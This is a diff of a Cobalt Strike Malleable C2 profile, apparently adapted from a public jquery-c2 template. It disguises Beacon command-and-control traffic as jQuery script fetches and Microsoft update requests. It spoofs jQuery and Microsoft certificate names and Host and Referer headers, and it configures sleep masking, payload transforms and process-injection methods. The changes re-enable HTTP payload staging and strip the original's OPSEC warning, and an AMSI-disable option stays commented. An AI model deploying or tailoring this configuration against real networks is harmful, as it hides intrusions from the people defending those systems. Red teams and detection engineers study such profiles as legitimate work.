@@ -1,23 +1,24 @@
-# Malleable C2 Profile
-# Version: CobaltStrike 3.14
-# File: jquery-c2.3.14.profile
-# Description: 
-#    c2 profile attempting to mimic a jquery.js request
-#    uses signed certificates
-#    or self-signed certificates
-# Authors: @joevest, @andrewchiles, @001SPARTaN 
+#My Template
 
 ################################################
 ## Profile Name
 ################################################
-set sample_name "My Profile";
+## Description:
+##    The name of this profile (used in the Indicators of Compromise report)
+## Defaults:
+##    sample_name: My Profile
+## Guidelines:
+##    - Choose a name that you want in a report
+set sample_name "Template";
 
 ################################################
 ## Sleep Times
 ################################################
+## Guidelines:
+##    - Beacon Timing (1000 = 1 sec)
 ##    - Consider using odd jitter time so the time doesn't loop back on itself (not verified as a technique)
 ##    - 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67
-set sleeptime "30000";        # 30 Seconds
+set sleeptime "60000";        # 1 Minute
 set jitter    "37";            # % jitter
 
 ################################################
@@ -29,10 +30,7 @@ set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
 ## SSL CERTIFICATE
 ################################################
 https-certificate {
-    #set keystore "/pathtokeystore";
-    #set password "password";
-
-    ## Option 3) Cobalt Strike Self-Signed Certificate
+    
     set C   "US";
     set CN  "jquery.com";
     set O   "jQuery";
@@ -41,22 +39,18 @@ https-certificate {
 }
 
 https-certificate "Microsoft" {
-    #set keystore "/pathtokeystore";
-    #set password "password";
-
-    ## Option 3) Cobalt Strike Self-Signed Certificate
+    
     set C   "US";
-    set CN  "microsoft.com";
+    set CN  "msstuff.com";
     set O   "Microsoft";
     set OU  "Certificate Authority";
     set validity "365";
 }
 
-
 ################################################
 ## AMSI Disable
 ################################################
-#	set amsi_disable "true";
+# set amsi_disable "true";
 
 ################################################
 ## SpawnTo Process
@@ -91,9 +85,7 @@ set dns_stager_subhost ".feeds.123456.";
 ################################################
 ## Staging process
 ################################################
-## OPSEC WARNING!!!! Staging has serious OPSEC issues. It is recommed to disable staging and use stageless payloads
-set host_stage "false"; # Do not use staging. Must use stagles payloads
-#set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
+set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set
 
 http-stager {  
     set uri_x86 "/jquery-3.3.1.slim.min.js";
@@ -146,16 +138,6 @@ stage {
     # CS 3.12 "Obfuscate and Sleep" for HTTP Beacons
     set sleep_mask     "true";
 
-    ## WARNING: Module stomping 
-    # Cobalt Strike 3.11 also adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.
-    # Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.
-    # While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon's process. If the current process loads the same library later (for whatever reason), you will crash Beacon's process. Choose carefully.
-    # By default, Beacon's loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon's x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It's important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.
-    # Details can be found in the In-memory Evasion video series. https://youtu.be/uWVH9l2GMw4
-
-    # set module_x64 "netshell.dll";
-    # set module_x86 "netshell.dll";
-
     # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
     transform-x86 { # transform the x86 rDLL stage
         prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend null bytes
@@ -198,7 +180,16 @@ process-inject {
         #append "\x90\x90";
     }
 
-   
+    # Disable the respective injection calls 
+    # Disables x86 -> x86 Injection
+    # disable "CreateRemoteThread";
+
+    # Disables x86 -> x64 Injection
+    # disable "RtlCreateUserThread";
+    
+    # Only code injection technique that doesn't appear to break anything when disabled
+    # disable "SetThreadContext";
+    
     execute {
 
         # The order is important. Each step will be attempted (if applicable) until successful
@@ -281,7 +272,7 @@ http-get "Microsoft" {
 
         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
         header "Host" "update.microsoft.com";
-        header "Referer" " ";
+        header "Referer" "http://microsoft.com/";
         header "Accept-Encoding" "gzip, deflate";
 
         metadata {
@@ -297,7 +288,7 @@ http-get "Microsoft" {
         header "Cache-Control" "max-age=0, no-cache";
         header "Pragma" "no-cache";
         header "Connection" "keep-alive";
-        header "Content-Type" "application/updateservices; charset=utf-8";
+        header "Content-Type" "application/javascript; charset=utf-8";
 
         output {   
             mask;
@@ -312,7 +303,6 @@ http-get "Microsoft" {
         }
     }
 }
-
 
 ################################################
 ## HTTP POST
@@ -373,7 +363,7 @@ http-post "Microsoft" {
 
         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
         header "Host" "update.microsoft.com";
-        header "Referer" " ";
+        header "Referer" "http://microsoft.com/";
         header "Accept-Encoding" "gzip, deflate";
        
         id {
@@ -395,7 +385,7 @@ http-post "Microsoft" {
         header "Cache-Control" "max-age=0, no-cache";
         header "Pragma" "no-cache";
         header "Connection" "keep-alive";
-        header "Content-Type" "application/updateservices; charset=utf-8";
+        header "Content-Type" "application/javascript; charset=utf-8";
 
         output {   
             mask;
